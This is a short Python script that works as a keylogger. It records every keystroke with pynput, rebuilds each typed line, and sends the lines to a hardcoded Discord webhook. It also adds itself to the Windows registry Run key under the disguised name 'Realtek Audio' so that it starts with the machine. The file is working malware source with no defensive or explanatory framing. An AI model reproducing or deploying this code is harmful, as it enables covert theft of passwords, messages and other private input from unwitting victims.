from pynput.keyboard import Key, Listener
from discord_webhook import DiscordWebhook
import pathlib, sys
import threading, subprocess

lista = []
lista_salvar = ''

local = str(pathlib.Path().absolute())
name = sys.argv[0]

path = local+name

subprocess.Popen('REG ADD HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v \"Realtek Audio\" /t REG_SZ /d \"'+path+'\" /f', shell = True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)

def on_press(msg):
    global lista,lista_salvar
    try:
        lista.append(msg.char)
    except:
        if msg == Key.enter:
            lista.append('\n')
            lista_salvar = ''.join(lista)
            lista = []

        elif msg == Key.space:
            lista.append(' ')

        elif msg == Key.backspace:
            try:
                lista.pop()
            except:
                pass

        else:
            pass

listener = Listener(on_press=on_press)
listener.start()

while True:
    if lista_salvar:
        webhook_urls = ['https://discord.com/api/webhooks/1413065804173541449/XlAyiWjlX1wxUa7uIUfO9Z539mdsiiMcuFY7DqCC25BQPtLmxMj1vE1Ko-Wtet5mNqO3']
        webhook = DiscordWebhook(url=webhook_urls, content=lista_salvar)
        response = webhook.execute()
        lista_salvar = ''
